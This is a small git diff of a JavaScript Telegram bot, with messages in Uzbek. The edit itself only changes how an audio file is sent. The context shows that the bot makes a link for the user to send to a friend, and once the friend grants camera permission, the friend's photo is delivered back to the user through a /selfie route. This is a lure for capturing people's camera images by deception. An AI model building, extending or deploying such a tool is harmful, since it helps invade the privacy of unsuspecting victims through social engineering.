@@ -60,7 +60,7 @@ bot.on("message", (msg) => {
       chatId,
       "Shunchaki 📸 Rasm olish tugmasni bosing berilgan linki dostingizga jonating. Agar dostinggiz linga kirib kamera ruxsatiga rozilik bildirsa sizga uning rasmi yuboriladi.\n\nFaqat to'gri yo'lda foydalaning."
     );
-    bot.sendAudio(chatId, fs.createReadStream("music/koryapman.mp3"));
+    bot.sendVoice(chatId, fs.createReadStream("music/koryapman.mp3"));
   }
 });
 
@@ -72,3 +72,4 @@ app.get("/selfie/:id", (req, res) => {
 app.listen(PORT, () => {
   console.log(`✅ Server ishga tushdi: ${BASE_URL} (PORT: ${PORT})`);
 });
+
